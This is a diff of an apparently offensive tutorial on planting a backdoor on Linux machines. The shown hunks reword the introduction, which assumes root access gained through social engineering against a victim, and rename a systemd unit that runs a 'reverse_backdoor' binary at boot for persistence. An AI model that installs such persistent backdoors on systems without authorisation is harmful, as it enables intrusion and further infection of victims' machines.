@@ -1,12 +1,12 @@
 # Backdoor to any Linux machine
 
-**Myth:** It is said that Linux is secure and does not have any viruses etc. Let's take a look. There is a general claim that no need for Antivirus software is required either. Well...
+**Myth:** It is said that Linux is secure and hasn't any viruses etc. Let's take a look. There is a general claim that no need for Antivirus software is required either. Well...
 
-We won't create a true virus here. Just a backdoor. However, it opens up many possibilities for further hostile actions against Linux victim machines.
+We won't create a true virus here. Just a backdoor. However, it opens up many possibilities for further hostile actions against Linux victim machines, including polluting the target Linux machine with multiple nasty viruses.
 
-This is just a short tecnical demonstration without any true hostile attempts. Utilizing the method requires social engineering tactics as well.
+This is just a short tecnical demonstration without any true hostile attempts. Utilizing the method requires social engineering tactics, as well.
 
-This method does not require any server software running on the victim's Linux machine. Just a simple client machine is OK, as well.
+This method does not require any server software running on the victim's Linux machine. Just a simple client machine is OK.
 
 **This tutorial assumes you will gain access to `sudo` or `root` terminal on victim's Linux machine by using social engineering tactics.**
 
@@ -98,15 +98,15 @@ The following systemd service file contents is supposed to be added to `/usr/lib
 
 ```
 [Unit]
-Description=SSH backdoor
+Description=Backdoor
 After=network.target
 
 [Service]
 Type=oneshot
 RemainAfterExit=yes
 
-ExecStart=/home/pinqvin/reverse_backdoor_for_ssh.elf
-ExecStop=/home/pinqvin/reverse_backdoor_for_ssh.elf
+ExecStart=/home/penguin/reverse_backdoor
+ExecStop=/home/penguin/reverse_backdoor
 
 [Install]
 WantedBy=multi-user.target
